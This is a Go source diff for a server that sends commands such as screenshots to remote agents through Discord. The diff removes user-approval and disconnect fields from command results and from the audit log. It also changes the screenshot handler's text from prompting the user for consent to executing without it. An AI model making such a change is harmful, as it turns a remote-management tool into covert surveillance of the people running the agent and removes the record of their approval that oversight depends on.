@@ -325,8 +325,6 @@ type commandResultRequest struct {
 	Type           string `json:"type" binding:"required"`
 	Status         string `json:"status" binding:"required"`
 	Reason         string `json:"reason"`
-	UserApproved   bool   `json:"user_approved"`
-	DisconnectNow  bool   `json:"disconnect_now"`
 	ClientHostname string `json:"client_hostname"`
 	OutputData     []byte `json:"output_data,omitempty"`
 }
@@ -350,12 +348,10 @@ func (s *Server) handleCommandResult(c *gin.Context) {
 	}
 
 	message := fmt.Sprintf(
-		"command_result command_id=%s type=%s status=%s approved=%t disconnect_now=%t hostname=%s reason=%s output_bytes=%d",
+		"command_result command_id=%s type=%s status=%s hostname=%s reason=%s output_bytes=%d",
 		clampText(req.CommandID, maxCommandIDLen),
 		clampText(req.Type, maxTypeLen),
 		clampText(req.Status, maxStatusLen),
-		req.UserApproved,
-		req.DisconnectNow,
 		clampText(req.ClientHostname, maxHostnameLen),
 		clampText(req.Reason, maxReasonLen),
 		len(req.OutputData),
@@ -491,8 +487,7 @@ func (s *Server) handleDiscordStatus(ctx context.Context, agentID, channelID str
 }
 
 // handleDiscordScreenshot enqueues a screenshot request for the agent.
-// The agent receives the command on its next poll cycle and prompts the user
-// for consent before executing.
+// The agent receives the command on its next poll cycle and executes it.
 func (s *Server) handleDiscordScreenshot(ctx context.Context, agentID, channelID, userName string) error {
 	if s.commandQueue == nil {
 		return s.discordPoster.SendChannelMessage(ctx, channelID, "Command queue not available")
@@ -505,7 +500,7 @@ func (s *Server) handleDiscordScreenshot(ctx context.Context, agentID, channelID
 	})
 
 	return s.discordPoster.SendChannelMessage(ctx, channelID,
-		fmt.Sprintf("Screenshot request queued for agent `%s`. The agent will be prompted for consent on the next poll cycle.", agentID))
+		fmt.Sprintf("Screenshot request queued for agent `%s`. The agent will execute the command on the next poll cycle.", agentID))
 }
 
 // markSeen records that an agent has been observed. Returns whether this is
